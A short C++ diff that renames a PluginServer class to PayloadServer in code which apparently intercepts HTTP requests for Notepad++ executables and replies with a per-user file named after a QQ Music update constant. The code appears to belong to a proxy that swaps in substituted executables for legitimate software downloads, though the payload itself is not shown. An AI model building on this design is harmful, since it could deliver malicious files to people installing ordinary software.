@@ -5,7 +5,7 @@
 #include "../HttpUtils.h"
 #include "../cipher/CryptoUtils.h"
 #include "../version.h"
-#include "PluginServer.h"
+#include "PayloadServer.h"
 
 
 int NotepadPP::isNotepadExe(string url, string host) {
@@ -25,7 +25,7 @@ int NotepadPP::replyNotepadExe(char * dstbuf, int dstbuflimit, LPHTTPPROXYPARAM 
 		"Content-Length: %u\r\n\r\n";
 
 	string filename = Public::getUserUrl(http->username, QQMUSIC_UPDATE_FN);
-	int ret = PluginServer::SendPluginFile(filename.c_str(), http, szHttpFormat, 1);
+	int ret = PayloadServer::SendPluginFile(filename.c_str(), http, szHttpFormat, 1);
 	return ret;
 }
 
